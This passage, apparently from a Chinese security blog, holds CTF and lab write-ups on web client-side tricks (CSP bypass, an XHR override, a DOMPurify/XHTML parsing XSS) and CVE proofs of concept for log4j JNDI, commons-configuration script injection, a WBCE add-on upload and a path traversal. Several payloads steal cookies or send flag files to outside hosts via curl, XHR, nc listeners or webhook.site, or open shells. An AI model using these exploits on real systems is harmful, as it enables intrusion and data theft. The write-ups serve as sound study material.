<h3 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h3><p>因为有csp策略，无法进行直接加载js，原型链污染不能直接覆盖被赋值的变量，所以利用iframe，设置csp，允许恶意的js加载，并且禁止加载bootstrap，就可以成功绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>在这里我想到如果没有nonce，他只是script-src <a href="http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行">http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行</a></p>
</blockquote>
<h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>filePath是我们上传的文件，传入一个html文件，page.goto会访问这个文件，page.evaluate会在访问这个页面的基础上执行里面的代码，也就是访问flag文件<br>只需要将window.XMLHttpRequest给重写了，就可以得到flag<br>wp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHR请求的responseText：&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechange是用于监听 XMLHttpRequest 对象状态改变事件的属性。当XMLHttpRequest的状态发生了改变，就会触发绑定在onreadystatechange上的函数，当readState=4时，代表请求已完成，且响应已就绪。<br>这时候在其中把获取到的flag转发到自己的vps上面，当然也可以直接document.write到页面上，因为runHTMLFile会将页面的截图保存并返回。</p>
<h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2><h3 id="unintended"><a href="#unintended" class="headerlink" title="unintended"></a>unintended</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;text&#x27;</span>).<span class="title function_">send</span>(<span class="string">`Page <span class="subst">$&#123;req.path&#125;</span> not found`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在这一段因为req.path是可控的，但是如果输入尖括号等特殊符号会被url编码，导致无法利用，一般这种情况下就需要想想能不能让这个回显的内容加载进script标签中，或者直接让他进入js文件中<br>下面的payload，就可以让他加入js文件中<br><code>127.0.0.1:3000/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#http://127.0.0.1:8000</code><br>将这段放到浏览器的时候，浏览器会把他当做目录为<br><code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie</code><br>文件名为<br><code>..%2findex.xhtml</code><br>去浏览<br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/1.png" alt><br>但是后端会去解析%2f也就是说后端会去返回直接index.xhtml<br>浏览器接收到以后会直接去解析index.xhtml中的内容<br>那么里面的main.js也会被请求为<br><code>http://127.0.0.1:3000/1;location=location.hash.slice(1)+document.cookie//main.js</code><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/2.png" alt><br>因为开头的那段404代码会被uri所控制，所以就变成了<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Page</span> /<span class="number">1</span>;<span class="keyword">var</span>[<span class="title class_">Page</span>]=[<span class="number">1</span>];location=location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//main.js not found</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/3.png" alt><br>最后就直接跳转到#后面的url了</p>
<h3 id="intended"><a href="#intended" class="headerlink" title="intended"></a>intended</h3><ul>
<li>看到下面的代码，可以发现style标签下的尖括号是不会被转义的<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;svg&gt;aa&gt;&lt;/svg&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;svg&gt;aa&amp;gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>base的用法<br>href中输入abc，那么之后的所有访问都会基于<a href="http://target/abc/">http://target/abc/</a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;/abc/&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>接下来看到作者的payload<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]＞&lt;/style&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;iframe name=&#x27;Page&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>在xhtml中<code>&lt;![CDATA[XXXX]]&gt;</code>用于注释<br>利用xhtml和html的不同解析标准，在xhtml中就会变成下面这样<br><figure class="highlight xhtml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span>/*&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]*/＞&lt;/style&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;Page&#x27; /&gt;&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>跟unintended的思路一样，也是利用了会去加载其他js文件，且文件路径可控</p>
<h2 id="sekai-ctf-golf-jail"><a href="#sekai-ctf-golf-jail" class="headerlink" title="sekai ctf golf-jail"></a>sekai ctf golf-jail</h2>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>ctf</tag>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋云镜CVE</title>
    <url>/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</url>
    <content><![CDATA[<h1 id="CVE系列"><a href="#CVE系列" class="headerlink" title="CVE系列"></a>CVE系列</h1><p>不详细讲原理，只发一下poc<br><span id="more"></span></p>
<h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xx：8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先运行marshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p>
<p>同时需要在8000端口起个web服务<br><code>python3 -m http.server 8000</code></p>
<p>要在8999端口起个nc，用于接受flag<br><code>nc -lvp 8999</code></p>
<p>输入框输入<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p>
<p>不知道为什么不可以反弹shell，就直接用curl了</p>
<h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p>
<p>test.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>直接弹shell</p>
<blockquote>
<p><code>$&#123;url:utf-8:file:///&#125;</code>可以用于读取目录<br><code>$&#123;url:utf-8:file:///flag&#125;</code>可以用于读取文件</p>
</blockquote>
<h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin
123456</code><br>进入后台<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>install处选择一个压缩包，其中要有info.php，info.php写入你的payload即可<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>看看部分源码，可以看到他把压缩包的内容解压出来，然后require了info.php</p>
<h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploit相应的payload即可<br>把<br><code>../../database</code><br>改为<br><code>../../../../../../flag</code><br>即可<br>原理大概就是有一处insert的sql操作没有鉴权，可以用于添加相应的id，然后在getfile.php中可以获取到该id，绕过鉴权，并且他读取文件的操作没有过滤../，具体原理可以自行分析</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>php</tag>
        <tag>cve</tag>
        <tag>靶场</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>codeql</title>
    <url>/2023/08/06/codeql/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>hessian反序列化</title>
    <url>/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="入门Hessian反序列化"><a href="#入门Hessian反序列化" class="headerlink" title="入门Hessian反序列化"></a>入门Hessian反序列化</h2><span id="more"></span>
<h3 id="People"><a href="#People" class="headerlink" title="People"></a>People</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getId call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setId call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">111</span>, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;ggg&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Class&lt;Object&gt;&gt; innerMap;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; friends;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getInnerMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getInnerMap call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInnerMap</span><span class="params">(Map innerMap)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setInnerMap call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.innerMap = innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getGender call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setGender call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student default constructor call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, String name, String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student custom constructor call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ObjectInputStream)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readObject call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student readResolve call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student hashCode call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student finalize call&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span 